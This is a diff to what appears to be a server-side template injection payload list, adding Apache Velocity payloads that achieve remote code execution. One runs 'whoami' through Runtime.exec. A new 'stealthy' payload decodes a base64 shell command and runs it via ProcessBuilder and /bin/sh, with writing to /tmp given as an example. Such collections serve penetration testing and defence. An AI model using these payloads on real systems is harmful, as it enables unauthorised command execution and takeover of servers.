@@ -211,9 +211,11 @@ New version of Pebble :
 
 [Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
 
-> Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.
+> Apache Velocity is a Java-based template engine that allows web designers to embed Java code references directly within templates.
 
-```python
+In a vulnerable environment, Velocity's expression language can be abused to achieve remote code execution (RCE). For example, this payload executes the whoami command and prints the result:
+
+```java
 #set($str=$class.inspect("java.lang.String").type)
 #set($chr=$class.inspect("java.lang.Character").type)
 #set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
@@ -221,6 +223,39 @@ $ex.waitFor()
 #set($out=$ex.getInputStream())
 #foreach($i in [1..$out.available()])
 $str.valueOf($chr.toChars($out.read()))
+#end
+```
+
+A more flexible and stealthy payload that supports base64-encoded commands, allowing execution of arbitrary shell commands such as `echo "a" > /tmp/a`. Below is an example with `whoami` in base64:
+
+```java
+#set($base64EncodedCommand = 'd2hvYW1p')
+
+#set($contextObjectClass = $knownContextObject.getClass())
+
+#set($Base64Class = $contextObjectClass.forName("java.util.Base64"))
+#set($Base64Decoder = $Base64Class.getMethod("getDecoder").invoke(null))
+#set($decodedBytes = $Base64Decoder.decode($base64EncodedCommand))
+
+#set($StringClass = $contextObjectClass.forName("java.lang.String"))
+#set($command = $StringClass.getConstructor($contextObjectClass.forName("[B"), $contextObjectClass.forName("java.lang.String")).newInstance($decodedBytes, "UTF-8"))
+
+#set($commandArgs = ["/bin/sh", "-c", $command])
+
+#set($ProcessBuilderClass = $contextObjectClass.forName("java.lang.ProcessBuilder"))
+#set($processBuilder = $ProcessBuilderClass.getConstructor($contextObjectClass.forName("java.util.List")).newInstance($commandArgs))
+#set($processBuilder = $processBuilder.redirectErrorStream(true))
+#set($process = $processBuilder.start())
+#set($exitCode = $process.waitFor())
+
+#set($inputStream = $process.getInputStream())
+#set($ScannerClass = $contextObjectClass.forName("java.util.Scanner"))
+#set($scanner = $ScannerClass.getConstructor($contextObjectClass.forName("java.io.InputStream")).newInstance($inputStream))
+#set($scannerDelimiter = $scanner.useDelimiter("\\A"))
+
+#if($scanner.hasNext())
+  #set($output = $scanner.next().trim())
+  $output.replaceAll("\\s+$", "").replaceAll("^\\s+", "")
 #end
 ```
 
